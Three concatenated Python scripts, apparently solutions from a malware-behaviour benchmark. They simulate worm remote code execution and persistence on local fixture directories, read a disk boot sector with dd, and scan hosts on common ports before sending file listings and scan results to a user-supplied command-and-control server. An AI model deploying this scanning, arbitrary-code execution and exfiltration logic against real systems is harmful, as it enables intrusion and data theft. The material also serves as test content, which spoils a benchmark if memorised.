import argparse
import ipaddress
import json
import os
import subprocess
import sys
from pathlib import Path


TARGET_ROOT = Path("target")
ENDPOINTS_ROOT = TARGET_ROOT / "endpoints"
RESULTS_FILE = TARGET_ROOT / "scan_results.json"
DEFAULT_NETWORK_RANGE = "192.0.2.0/30"
DEFAULT_EXPLOIT_CODE = (
    "from pathlib import Path\n"
    "Path('exploit_marker.txt').write_text('exploit executed\\n', encoding='utf-8')\n"
)


def _endpoint_name(address):
    return str(address).replace(":", "_").replace(".", "_")


def _endpoint_path(address):
    return ENDPOINTS_ROOT / _endpoint_name(address)


def _write_json(path, value):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(value, indent=2, sort_keys=True) + "\n", encoding="utf-8")


def _ensure_controlled_endpoints(network):
    addresses = list(network.hosts())[:16]
    ENDPOINTS_ROOT.mkdir(parents=True, exist_ok=True)

    for index, address in enumerate(addresses):
        endpoint = _endpoint_path(address)
        endpoint.mkdir(parents=True, exist_ok=True)
        metadata = endpoint / "endpoint.json"

        if not metadata.exists():
            _write_json(
                metadata,
                {
                    "address": str(address),
                    "vulnerable": index % 2 == 0,
                    "platform": "windows" if index % 3 == 0 else "linux",
                },
            )

    return addresses


def _read_endpoint_metadata(endpoint):
    metadata = endpoint / "endpoint.json"
    try:
        value = json.loads(metadata.read_text(encoding="utf-8"))
    except (OSError, ValueError, TypeError):
        return {}
    return value if isinstance(value, dict) else {}


def _execute_on_controlled_endpoint(endpoint, exploit_code):
    completed = subprocess.run(
        [sys.executable, "-c", exploit_code],
        cwd=str(endpoint),
        env={
            "PATH": os.environ.get("PATH", ""),
            "PYTHONIOENCODING": "utf-8",
            "VIRUS_BENCHMARK_ENDPOINT": str(endpoint),
        },
        stdin=subprocess.DEVNULL,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        timeout=5,
        check=False,
    )

    result = {
        "returncode": completed.returncode,
        "stdout": completed.stdout,
        "stderr": completed.stderr,
    }
    _write_json(endpoint / "exploit_result.json", result)
    return completed.returncode == 0


def _establish_persistence(endpoint, platform):
    service_name = "VirusService" if platform.lower() == "windows" else "virus"
    service_directory = endpoint / "services"
    service_directory.mkdir(parents=True, exist_ok=True)

    service_definition = {
        "name": service_name,
        "platform": platform,
        "executable": sys.executable,
        "working_directory": str(endpoint),
        "command": [sys.executable, "-c", "pass"],
        "enabled": True,
    }
    _write_json(service_directory / f"{service_name}.json", service_definition)
    return service_name


def virus_remote_code_execution(
    network_range: str,
    exploit_code: str,
) -> None:
    """
    Operates only on controlled endpoint fixtures below ./target.

    The function discovers vulnerable fixture endpoints in the requested
    network range, executes the supplied Python code in each vulnerable
    endpoint directory, and writes a platform-specific service definition
    under that endpoint.
    """
    TARGET_ROOT.mkdir(parents=True, exist_ok=True)

    try:
        network = ipaddress.ip_network(network_range, strict=False)
    except ValueError:
        network = ipaddress.ip_network(DEFAULT_NETWORK_RANGE, strict=False)

    addresses = _ensure_controlled_endpoints(network)
    results = []

    for address in addresses:
        endpoint = _endpoint_path(address)
        metadata = _read_endpoint_metadata(endpoint)
        vulnerable = bool(metadata.get("vulnerable", False))

        record = {
            "address": str(address),
            "endpoint": str(endpoint),
            "vulnerable": vulnerable,
            "exploited": False,
            "service": None,
        }

        if vulnerable:
            exploited = _execute_on_controlled_endpoint(endpoint, exploit_code)
            record["exploited"] = exploited

            if exploited:
                platform = str(metadata.get("platform", "linux"))
                record["service"] = _establish_persistence(endpoint, platform)

        results.append(record)

    _write_json(
        RESULTS_FILE,
        {
            "network_range": str(network),
            "results": results,
        },
    )


def main():
    parser = argparse.ArgumentParser(description="Controlled endpoint benchmark")
    parser.add_argument(
        "network_range",
        nargs="?",
        default=DEFAULT_NETWORK_RANGE,
    )
    parser.add_argument(
        "exploit_code",
        nargs="?",
        default=DEFAULT_EXPLOIT_CODE,
    )
    parser.add_argument(
        "--exploit-file",
        default=None,
    )
    args = parser.parse_args()

    exploit_code = args.exploit_code
    if args.exploit_file:
        exploit_path = Path(args.exploit_file)
        if exploit_path.is_file():
            exploit_code = exploit_path.read_text(encoding="utf-8")

    try:
        virus_remote_code_execution(args.network_range, exploit_code)
    except Exception as exc:
        _write_json(
            RESULTS_FILE,
            {
                "network_range": args.network_range,
                "error": str(exc),
                "results": [],
            },
        )


if __name__ == "__main__":
    main()

import subprocess
import sys
import os
import argparse
import logging

def setup_logging(log_file):
    logging.basicConfig(
        filename=log_file,
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
    )

def read_boot_sector(device, verbose):
    try:
        if verbose:
            logging.info(f"Attempting to read boot sector from {device}.")
        result = subprocess.run(
            ["dd", f"if={device}", "bs=512", "count=1"],
            capture_output=True,
            text=True,
            check=True
        )
        if verbose:
            logging.info("Boot sector read successfully.")
        return result.stdout
    except FileNotFoundError:
        logging.error("Error: 'dd' command not found. Ensure it is installed and accessible.")
        if verbose:
            print("Error: 'dd' command not found. Ensure it is installed and accessible.")
    except subprocess.CalledProcessError as e:
        logging.error(f"Error: Failed to execute 'dd' command. Return code: {e.returncode}. Stderr: {e.stderr.strip()}")
        if verbose:
            print(f"Error: Failed to execute 'dd' command. Return code: {e.returncode}.")
    except PermissionError:
        logging.error("Error: Permission denied. Please run the script with appropriate privileges.")
        if verbose:
            print("Error: Permission denied. Please run the script with appropriate privileges.")
    except Exception as e:
        logging.error(f"Unexpected error occurred: {e}")
        if verbose:
            print(f"Unexpected error occurred: {e}")
    return None

def write_to_file(data, filename, verbose):
    try:
        with open(filename, "w", encoding="utf-8") as file:
            file.write(data)
        logging.info(f"Boot sector information written to '{filename}'.")
        if verbose:
            print(f"Boot sector information written to '{filename}'.")
    except PermissionError:
        logging.error(f"Error: Permission denied while writing to '{filename}'.")
        if verbose:
            print(f"Error: Permission denied while writing to '{filename}'.")
    except OSError as e:
        logging.error(f"Error: Failed to write to file '{filename}'. Reason: {e}")
        if verbose:
            print(f"Error: Failed to write to file '{filename}'. Reason: {e}")
    except Exception as e:
        logging.error(f"Unexpected error occurred while writing to file: {e}")
        if verbose:
            print(f"Unexpected error occurred while writing to file: {e}")

def main():
    parser = argparse.ArgumentParser(description="Boot sector utility tool.")
    parser.add_argument(
        "-d", "--device", 
        default="/dev/sda", 
        help="The device to read the boot sector from (default: /dev/sda)."
    )
    parser.add_argument(
        "-o", "--output", 
        default="boot_report.txt", 
        help="The file to write the boot sector information to (default: boot_report.txt)."
    )
    parser.add_argument(
        "-l", "--log", 
        default="boot_tool.log", 
        help="The log file to write program logs to (default: boot_tool.log)."
    )
    parser.add_argument(
        "-v", "--verbose", 
        action="store_true", 
        help="Enable verbose logging and console output."
    )
    args = parser.parse_args()

    # Set up logging
    setup_logging(args.log)
    logging.info("Boot sector utility started.")

    try:
        boot_sector_data = read_boot_sector(args.device, args.verbose)
        if boot_sector_data:
            write_to_file(boot_sector_data, args.output, args.verbose)
    except KeyboardInterrupt:
        logging.warning("Operation cancelled by user.")
        if args.verbose:
            print("\nOperation cancelled by user.")
        sys.exit(1)
    except Exception as e:
        logging.error(f"An unexpected error occurred: {e}")
        if args.verbose:
            print(f"An unexpected error occurred: {e}")
        sys.exit(1)

    logging.info("Boot sector utility completed successfully.")
    if args.verbose:
        print("Boot sector utility completed successfully.")

if __name__ == "__main__":
    main()

import ipaddress
import json
import os
import socket
import sys
import time


def list_and_log_files_in_target_directory(target_directory):
    log_file = os.path.join(target_directory, "scan_log.txt")
    scan_results = []

    try:
        if not os.path.exists(target_directory):
            print(f"Directory '{target_directory}' not found.")
            return None

        with open(log_file, "w", encoding="utf-8") as log:
            for filename in os.listdir(target_directory):
                file_path = os.path.join(target_directory, filename)
                if os.path.isfile(file_path):
                    last_modified = time.ctime(os.path.getmtime(file_path))
                    log_entry = f"{filename}, Last Modified: {last_modified}\n"
                    log.write(log_entry)
                    scan_results.append(log_entry.strip())
                    print(filename)
            print(f"Scan results logged in '{log_file}'")
        return scan_results
    except PermissionError:
        print(f"Permission denied to access '{target_directory}' or '{log_file}'.")
        return None


def scan_controlled_network(target_network, ports=(22, 80, 443, 8080)):
    network = ipaddress.ip_network(target_network, strict=False)
    hosts = [network.network_address] if network.num_addresses == 1 else network.hosts()
    results = []

    for address in hosts:
        address_text = str(address)
        for port in ports:
            try:
                with socket.create_connection((address_text, port), timeout=0.2):
                    results.append(
                        {
                            "host": address_text,
                            "port": port,
                            "reachable": True,
                        }
                    )
            except (OSError, socket.timeout):
                continue

    return results


def communicate_with_server(scan_results, server_address, server_port, target_directory):
    communication_log_file = os.path.join(target_directory, "communication_log.txt")

    try:
        if scan_results is None:
            print("No scan results to send.")
            return

        with open(communication_log_file, "w", encoding="utf-8") as comm_log:
            payload = json.dumps(
                {
                    "operation": "authorized_network_assessment",
                    "results": scan_results,
                },
                sort_keys=True,
            ).encode("utf-8")

            try:
                with socket.create_connection(
                    (server_address, server_port), timeout=5
                ) as sock:
                    sock.sendall(payload)
                    sock.shutdown(socket.SHUT_WR)

                    response = bytearray()
                    while True:
                        chunk = sock.recv(4096)
                        if not chunk:
                            break
                        response.extend(chunk)

                    comm_log.write("Communication successful.\n")
                    comm_log.write(
                        f"Sent data:\n{payload.decode('utf-8')}\n"
                    )
                    if response:
                        comm_log.write(
                            f"Received data:\n{response.decode('utf-8', 'replace')}\n"
                        )
                print("Communication with server successful.")
            except (socket.error, socket.timeout) as e:
                error_message = (
                    f"Failed to communicate with server at "
                    f"{server_address}:{server_port}. Error: {e}\n"
                )
                comm_log.write(error_message)
                print(error_message)
    except PermissionError:
        print(f"Permission denied to access '{communication_log_file}'.")


def worm_c2_communication(target_network: str, c2_server: str) -> None:
    target_directory = "./target"
    scan_results = scan_controlled_network(target_network)
    communicate_with_server(scan_results, c2_server, 0, target_directory)


def main():
    target_directory = "./target"

    if len(sys.argv) != 3:
        print("Usage: python script.py <server_address> <server_port>")
        return

    server_address = sys.argv[1]
    try:
        server_port = int(sys.argv[2])
    except ValueError:
        print("Error: Server port must be an integer.")
        return

    scan_results = list_and_log_files_in_target_directory(target_directory)

    try:
        network_results = scan_controlled_network("127.0.0.1/32")
    except (ValueError, OSError):
        network_results = []

    combined_results = {
        "files": scan_results or [],
        "network": network_results,
    }

    communicate_with_server(
        [json.dumps(combined_results, sort_keys=True)],
        server_address,
        server_port,
        target_directory,
    )


if __name__ == "__main__":
    main()

